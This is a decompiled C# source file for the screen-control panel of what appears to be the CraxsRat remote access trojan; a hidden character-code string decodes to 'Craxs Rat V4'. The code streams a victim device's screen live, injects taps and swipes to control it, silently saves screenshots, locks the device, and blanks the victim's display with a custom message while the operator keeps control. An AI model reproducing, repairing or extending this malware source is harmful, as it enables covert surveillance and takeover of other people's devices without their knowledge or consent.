using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

// Token: 0x020000B9 RID: 185
[DesignerGenerated]
public partial class ScreenShoter : Form
{
	// Token: 0x060007C1 RID: 1985 RVA: 0x000B6F9C File Offset: 0x000B519C
	public ScreenShoter()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs;
		base.FormClosing += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg;
		base.KeyDown += this.ScreenShoter_KeyDown_1;
		this.ScreenShotFoucs = false;
		this.Rnew = 0;
		this.Title = "null";
		this.@checked = false;
		this.sizearry = new string[]
		{
			"Auto",
			"2560x1600",
			"2048x1536",
			"1920x1200",
			"1920x1152",
			"1920x1080",
			"1600x1200",
			"1600x900",
			"1440x904",
			"1366x768",
			"1360x768",
			"1280x960",
			"1280x800",
			"1280x768",
			"1280x720",
			"1279x720",
			"1152x720",
			"1080x607",
			"1024x960",
			"1024x770",
			"1024x768",
			"1024x600",
			"960x640",
			"960x600",
			"960x540",
			"864x480",
			"854x480",
			"800x600",
			"800x480",
			"768x576",
			"640x480",
			"640x360",
			"480x320",
			"432x240",
			"450x300",
			"400x240",
			"320x240",
			"280x280"
		};
		this.Swaping = false;
		this.isdown = false;
		this.isclick = false;
		this.recordit = false;
		this.tiks = 0;
		this.iscontroled = false;
		this.keepmeto = false;
		this.InitializeComponent();
	}

	// Token: 0x060007C4 RID: 1988
	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	// Token: 0x060007C5 RID: 1989 RVA: 0x000BB684 File Offset: 0x000B9884
	private void trans()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.Save.Text = "节省";
				this.checkblock.Text = "屏幕阻挡";
				this.chkctrl.Text = "允许控制";
				this.StartButton.Text = Codes.Translate(this.StartButton.Text, "en", "zh");
				this.StopButton.Text = Codes.Translate(this.StopButton.Text, "en", "zh");
			}
		}
		else
		{
			this.Save.Text = "حفظ";
			this.checkblock.Text = "حظر";
			this.chkctrl.Text = "تحكم";
			this.StartButton.Text = Codes.Translate(this.StartButton.Text, "en", "ar");
			this.StopButton.Text = Codes.Translate(this.StopButton.Text, "en", "ar");
		}
	}

	// Token: 0x060007C6 RID: 1990 RVA: 0x000BB7B8 File Offset: 0x000B99B8
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs(object sender, EventArgs e)
	{
		this.combosize.Items.Clear();
		this.trans();
		string[] array = this.sizearry;
		foreach (string item in array)
		{
			this.combosize.Items.Add(item);
		}
		string text = RegistryHandler.GET_Tip(RegistryHandler.ShowScrenShotTip);
		bool flag = true;
		if (text != null)
		{
			if (Operators.CompareString(text, "no", false) == 0)
			{
				flag = false;
			}
		}
		else
		{
			flag = true;
		}
		if (flag)
		{
			base.KeyPreview = true;
		}
		base.Tag = this.classClient.ClientRemoteAddress;
		this.toptitle.Text = " ";
		this.combosize.Text = "Auto";
		this.PictureBox2.Image = this.classClient.Wallpaper;
		this.PictureBox3.Image = this.classClient.Flag;
		base.TransparencyKey = Color.FromArgb(45, 45, 45);
		this.BackColor = Color.FromArgb(45, 45, 45);
		this.Qualtibox.Text = MySettingsProperty.Settings.live_sc_qulty;
		int num = 2;
		checked
		{
			do
			{
				this.FPSBOX.Items.Add(num.ToString());
				num++;
			}
			while (num <= 30);
			this.FPSBOX.Text = "30";
			this.Qualtibox.Items.Clear();
			int num2 = 1;
			do
			{
				this.Qualtibox.Items.Add(num2.ToString());
				num2++;
			}
			while (num2 <= 100);
			this.Qualtibox.Text = "50";
			this.PBS.MinimumSize = new Size(0, 0);
			this.PBS.Size = new Size(384, 5);
			this.PBS.Width = 384;
			this.PBS.Height = 5;
			IntPtr hWndInsertAfter = new IntPtr(-2);
			ScreenShoter.SetWindowPos(base.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
			this.keepmeto = true;
		}
	}

	// Token: 0x060007C7 RID: 1991 RVA: 0x000BB9CC File Offset: 0x000B9BCC
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscdasjj(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>U",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007C8 RID: 1992 RVA: 0x000BBAF4 File Offset: 0x000B9CF4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcds(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>D",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007C9 RID: 1993 RVA: 0x000BBC1C File Offset: 0x000B9E1C
	private void Button3_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>L",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007CA RID: 1994 RVA: 0x000BBD44 File Offset: 0x000B9F44
	private void Button4_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>R",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007CB RID: 1995 RVA: 0x0000206C File Offset: 0x0000026C
	public void Viewdimiss()
	{
	}

	// Token: 0x060007CC RID: 1996 RVA: 0x000BBE6C File Offset: 0x000BA06C
	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		this.ScreenShotFoucs = false;
		this.Dismisbtn.Visible = false;
		if (e.Button == MouseButtons.Left)
		{
			this.Trakpoint = new List<Point>();
			this.Trakpoint.Add(new Point(e.X, e.Y));
			this.isclick = false;
			this.isdown = true;
		}
		else
		{
			this.presstimer.Enabled = true;
			this.isclick = true;
		}
	}

	// Token: 0x060007CD RID: 1997 RVA: 0x000BBEE8 File Offset: 0x000BA0E8
	private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		this.isdown = false;
		int width = this.Livepicbox.Width;
		int height = this.Livepicbox.Height;
		checked
		{
			if (!this.isclick)
			{
				if (this.Swaping)
				{
					this.Swaping = false;
					this.Trakpoint.Add(new Point(e.X, e.Y));
					StringBuilder stringBuilder = new StringBuilder();
					foreach (Point point in this.Trakpoint)
					{
						stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.ScreenSize.Height / (double)height)))).ToString() + ":");
					}
					string[] array = this.classClient.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							stringBuilder.ToString(),
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
				}
			}
			else
			{
				this.presstimer.Enabled = false;
				this.presstimer.Stop();
				string text = "clk:";
				if (this.tiks > 3)
				{
					text = "clk:hold:";
				}
				this.tiks = 0;
				Point point2 = this.Livepicbox.PointToClient(Control.MousePosition);
				if (Operators.CompareString(this.combosize.Text, "Auto", false) != 0)
				{
					string[] array2 = this.combosize.Text.Split(new char[]
					{
						'x'
					});
					this.ScreenSize = new Size(Conversions.ToInteger(array2[1]), Conversions.ToInteger(array2[0]));
				}
				Point point3 = new Point((int)Math.Round(unchecked((double)point2.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point2.Y * ((double)this.ScreenSize.Height / (double)height))));
				text = text + point3.X.ToString() + ":" + point3.Y.ToString();
				string[] array3 = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						text,
						Data.SPL_SOCKET,
						array3[0],
						Data.SPL_SOCKET,
						array3[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects2);
			}
		}
	}

	// Token: 0x060007CE RID: 1998 RVA: 0x000BC330 File Offset: 0x000BA530
	private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		if (this.isdown)
		{
			this.Swaping = true;
			this.isclick = false;
			if (e.X > 0 && e.Y > 0)
			{
				this.Trakpoint.Add(new Point(e.X, e.Y));
			}
		}
	}

	// Token: 0x060007CF RID: 1999 RVA: 0x0000206C File Offset: 0x0000026C
	private void Button1_Click_2(object sender, EventArgs e)
	{
	}

	// Token: 0x060007D0 RID: 2000 RVA: 0x0000206C File Offset: 0x0000026C
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgfnbwq(object sender, EventArgs e)
	{
	}

	// Token: 0x060007D1 RID: 2001 RVA: 0x0000206C File Offset: 0x0000026C
	private void Autosave_CheckedChanged(object sender)
	{
	}

	// Token: 0x060007D2 RID: 2002
	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	// Token: 0x060007D3 RID: 2003
	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	// Token: 0x060007D4 RID: 2004 RVA: 0x000BC388 File Offset: 0x000BA588
	private void Panel2_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ScreenShoter.ReleaseCapture();
			ScreenShoter.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	// Token: 0x060007D5 RID: 2005 RVA: 0x000BC388 File Offset: 0x000BA588
	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ScreenShoter.ReleaseCapture();
			ScreenShoter.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	// Token: 0x060007D6 RID: 2006 RVA: 0x000BC388 File Offset: 0x000BA588
	private void Panel4_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ScreenShoter.ReleaseCapture();
			ScreenShoter.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	// Token: 0x060007D7 RID: 2007 RVA: 0x0000206C File Offset: 0x0000026C
	private void Button1_Click_3(object sender, EventArgs e)
	{
	}

	// Token: 0x060007D8 RID: 2008 RVA: 0x000BC3C0 File Offset: 0x000BA5C0
	public string Clientout(string timeoutmil)
	{
		string[] array = (timeoutmil + "​97​120​115​32​82​97​116​32​86​52").Replace("​", " ").Split(new char[]
		{
			' '
		});
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Length > 0)
			{
				text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
			}
		}
		return text;
	}

	// Token: 0x060007D9 RID: 2009 RVA: 0x000BC444 File Offset: 0x000BA644
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg(object sender, FormClosingEventArgs e)
	{
		base.Name = null;
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sc:off",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.toptitle.Text = "...";
				this.classClient.SendMessage(parametersObjects);
				this.StartButton.Enabled = true;
				this.StopButton.Enabled = false;
				this.toptitle.Text = " ";
				this.vewpnl.Enabled = false;
				this.Livepicbox.Enabled = false;
				this.LIVE = false;
				this.refreshtimer.Stop();
				this.PBS.Value = 0;
			}
			catch (Exception)
			{
			}
		}
		base.Dispose();
	}

	// Token: 0x060007DA RID: 2010 RVA: 0x000BC5F0 File Offset: 0x000BA7F0
	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (this.Save.Checked)
		{
			if (!Directory.Exists(this.DownloadsFolder + "\\ScreenShots"))
			{
				Directory.CreateDirectory(this.DownloadsFolder + "\\ScreenShots");
			}
			try
			{
				this.Livepicbox.Image.Save(string.Concat(new string[]
				{
					this.DownloadsFolder,
					"\\ScreenShots\\IMG-",
					DateTime.Now.Day.ToString(),
					"-",
					DateTime.Now.Month.ToString(),
					"-",
					DateTime.Now.Millisecond.ToString(),
					".png"
				}));
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		this.Timer1.Stop();
	}

	// Token: 0x060007DB RID: 2011 RVA: 0x000BC6F8 File Offset: 0x000BA8F8
	private void Refreshtimer_Tick(object sender, EventArgs e)
	{
		if (this.LIVE)
		{
			if (this.Rnew != 0)
			{
				try
				{
					if (this.PBS.Value < this.PBS.Maximum)
					{
						DrakeUIProcessBar pbs = this.PBS;
						int value = pbs.Value;
						pbs.Value = checked(value + 1);
					}
					else
					{
						this.PBS.Value = 0;
					}
				}
				catch (Exception)
				{
				}
				this.Rnew = 0;
			}
		}
		else
		{
			this.refreshtimer.Stop();
			this.refreshtimer.Enabled = false;
		}
	}

	// Token: 0x060007DC RID: 2012 RVA: 0x000BC78C File Offset: 0x000BA98C
	public void Done(object[] objs)
	{
		if (this.toptitle.InvokeRequired)
		{
			ScreenShoter.addLogback method = new ScreenShoter.addLogback(this.Done);
			this.toptitle.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			string text = Conversions.ToString(objs[0]);
			this.toptitle.Text = text;
		}
	}

	// Token: 0x060007DD RID: 2013 RVA: 0x0000359B File Offset: 0x0000179B
	private void Presstimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			this.tiks++;
		}
	}

	// Token: 0x060007DE RID: 2014 RVA: 0x000BC7E4 File Offset: 0x000BA9E4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LK",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007DF RID: 2015 RVA: 0x000BC90C File Offset: 0x000BAB0C
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj(object sender, EventArgs e)
	{
		this.Livepicbox.Enabled = true;
		this.LIVE = true;
		if (Operators.CompareString(this.SKtype.Text, "Slient", false) == 0)
		{
			if (this.classClient == null)
			{
				return;
			}
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>SK",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		if (this.classClient != null)
		{
			try
			{
				string[] array2 = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>SK2",
						Data.SPL_SOCKET,
						array2[0],
						Data.SPL_SOCKET,
						array2[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects2);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007E0 RID: 2016 RVA: 0x000BCB84 File Offset: 0x000BAD84
	private void Dismisbtn_Click(object sender, EventArgs e)
	{
		if (this.Livepicbox.Image != null)
		{
			this.Livepicbox.Image = null;
			this.ScreenShotFoucs = false;
			this.Dismisbtn.Visible = false;
		}
	}

	// Token: 0x060007E1 RID: 2017 RVA: 0x000BCBC0 File Offset: 0x000BADC0
	private void Checkblock_MouseClick(object sender, MouseEventArgs e)
	{
		TcpClient myClient = this.classClient.myClient;
		string[] array = this.classClient.Keys.Split(new char[]
		{
			':'
		});
		if (this.checkblock.Checked)
		{
			if (this.classClient != null)
			{
				Dialog1 dialog = new Dialog1();
				dialog.Title = "Blocking message (optional)";
				dialog.ShowDialog();
				if (dialog.DialogResult == DialogResult.OK)
				{
					object[] parametersObjects = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"Blkt<*>",
							dialog.TheText,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
				}
				this.chkctrl.Enabled = true;
				object[] parametersObjects2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"BLKV<*>on",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects2);
			}
		}
		else if (this.classClient != null)
		{
			this.chkctrl.Enabled = false;
			object[] parametersObjects3 = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"BLKV<*>off",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects3);
		}
	}

	// Token: 0x060007E2 RID: 2018 RVA: 0x0000206C File Offset: 0x0000026C
	private void ScreenShoter_KeyDown(object sender, KeyEventArgs e)
	{
	}

	// Token: 0x060007E3 RID: 2019 RVA: 0x0000206C File Offset: 0x0000026C
	private void ScreenShoter_KeyUp(object sender, KeyEventArgs e)
	{
	}

	// Token: 0x060007E4 RID: 2020 RVA: 0x000BCEF8 File Offset: 0x000BB0F8
	private void Save_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.Save.Checked)
		{
			this.Timer1.Start();
		}
		else
		{
			this.Timer1.Stop();
		}
	}

	// Token: 0x060007E5 RID: 2021 RVA: 0x000BCF2C File Offset: 0x000BB12C
	private void DrakeUIAvatar3_Click(object sender, EventArgs e)
	{
		if (this.classClient != null && !this.LIVE)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sc:on:",
						this.Qualtibox.Text,
						"~",
						this.FPSBOX.Text,
						"~",
						this.classClient.ClientRemoteAddress,
						"~",
						MySettingsProperty.Settings.resolution,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.toptitle.Text = "Connecting , Please Wait...";
				this.StartButton.Enabled = false;
				this.StopButton.Enabled = true;
				this.vewpnl.Enabled = true;
				this.Livepicbox.Enabled = true;
				this.LIVE = true;
				this.refreshtimer.Enabled = true;
				this.refreshtimer.Start();
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007E6 RID: 2022 RVA: 0x000BD11C File Offset: 0x000BB31C
	private void DrakeUIAvatar6_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LKOS",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
		base.Close();
	}

	// Token: 0x060007E7 RID: 2023 RVA: 0x000BD248 File Offset: 0x000BB448
	private void Chkctrl_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.chkctrl.Checked)
		{
			if (this.LIVE && this.checkblock.Checked)
			{
				this.iscontroled = true;
				if (this.classClient != null)
				{
					string[] array = this.classClient.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"pslock<*>allow",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
				}
			}
		}
		else if (Conversions.ToBoolean(this.iscontroled) && this.classClient != null)
		{
			string[] array2 = this.classClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"pslock<*>disallow",
					Data.SPL_SOCKET,
					array2[0],
					Data.SPL_SOCKET,
					array2[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects2);
		}
	}

	// Token: 0x060007E8 RID: 2024 RVA: 0x000029F7 File Offset: 0x00000BF7
	private void DrakeUIAvatar5_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x060007E9 RID: 2025 RVA: 0x000BD4BC File Offset: 0x000BB6BC
	private void DrakeUIAvatar3_Click_1(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Bc",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

